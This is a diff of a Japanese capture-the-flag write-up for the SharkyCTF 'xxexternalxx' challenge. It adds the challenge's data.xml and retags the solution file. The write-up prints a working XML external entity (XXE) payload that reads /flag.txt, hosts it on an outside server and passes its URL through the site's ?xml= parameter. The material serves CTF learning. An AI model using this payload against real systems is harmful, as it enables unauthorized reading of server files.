@@ -9,6 +9,12 @@ Home
 Show stored data  
 [site2.png](site/site2.png)  
 Show stored dataページに注目するとURLがhttp://xxexternalxx.sharkyctf.xyz/?xml=data.xml となっている。  
+以下のhttp://xxexternalxx.sharkyctf.xyz/data.xml を読み出しているようだ。  
+```xml:data.xml
+<root>
+    <data>17/09/2019 the platform is now online, the fonctionnalities it contains will be audited by one of our society partenairs</data>
+</root>
+```
 http://xxexternalxx.sharkyctf.xyz/?xml= にアクセスすると以下のエラーが出る。  
 ```text:エラー
 Warning: file_get_contents(): Filename cannot be empty in /var/www/html/index.php on line 20
@@ -21,7 +27,7 @@ Notice: Trying to get property 'data' of non-object in /var/www/html/index.php o
 ```
 XXEを行い、flag.txtを読み出せばよい。  
 http://www.xxxxx.xxx/hack.xml には以下のxmlを設置した。  
-```xml
+```xml:hack.xml
 <?xml version="1.0"?><!DOCTYPE root [<!ENTITY satoki SYSTEM '/flag.txt'>]><root><data>&satoki;</data></root>
 ```
 http://xxexternalxx.sharkyctf.xyz/?xml=http://www.xxxxx.xxx/hack.xml にアクセスするとflagが表示される。  
